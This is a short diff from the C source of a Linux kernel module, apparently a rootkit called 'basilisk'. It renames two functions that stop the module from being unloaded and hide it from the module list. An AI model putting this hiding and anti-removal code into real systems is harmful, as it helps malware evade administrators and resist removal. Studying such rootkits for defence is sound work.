@@ -197,7 +197,7 @@ A reference to a module can be released with module_put().
 NOTE: The module can still be removed with rmmod -f [MOD] if the kernel was
 compiled this way.
 */
-void handle_lkm_protect(void) {
+void h_lkm_protect(void) {
   if (!protected) {
     pr_info("basilisk: protecting kernel module\n");
     try_module_get(lkm.this_mod);
@@ -211,7 +211,7 @@ void handle_lkm_protect(void) {
 /*
 Helper function to handle hiding/showing our LKM
 */
-void handle_lkm_hide(void) {
+void h_lkm_hide(void) {
   if (!hidden) {
     pr_info("basilisk: hiding kernel module\n");
     proc_hide();
